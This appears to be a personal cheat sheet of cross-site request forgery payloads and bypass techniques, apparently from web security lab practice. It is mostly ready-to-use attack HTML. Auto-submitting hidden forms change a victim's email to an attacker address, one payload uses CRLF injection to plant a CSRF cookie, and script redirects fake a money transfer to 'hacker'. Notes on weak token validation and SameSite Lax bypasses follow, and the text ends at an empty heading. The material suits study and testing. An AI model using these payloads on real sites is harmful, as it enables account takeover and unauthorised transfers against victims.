#### Simple payloads payloads

```html
<html>
	<body>
		<form action="https://vulnerable-website.com/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

```html
<html>
	<body>
		<form action="https://vulnerable-website.com/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form>
		<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>
```

#### Wait until the DOM is ready

```javascript
document.addEventListener('DOMContentLoaded', function() {
   console.log('document is ready. I can sleep now');
});
```

## Common flaws in CSRF token validation

- Validation of CSRF depends on request method. Sometimes, app correctly validate POST request but fails when different method is used. -> Try GET method insted
- Validation depends on token being present -> Try removing the entire parameter.
- CSRF is NOT tied to the user session -> Use attacker CSRF
- CSRF token is tied to a non-session cookie -> Exploit functionality that allow an attacker to set a cookie in a victim's browser. -> Obtain a valid CSRF and token, replace the victim's cookie and use the valid token
- CSRF is duplicated in a cookie -> Again, attacker must replace the victim's cookie


## SameSite cookie restriction

#### Bypassing Lax restriction using GET requests

If Cookie is set to Lax we can bypass restriction using GET requests

```html
<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
```

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
	<input type="hidden" name="_method" value="GET">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>
```

```html
<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000&_method=POST'; </script>
```

#### Bypassing restrictions using on-site gadgets

For example, using an open redirect + GET to perform the desired action. 
Open redirects fulfill the Restrict restriction

#### Bypassing restrictions using vulnerable sibling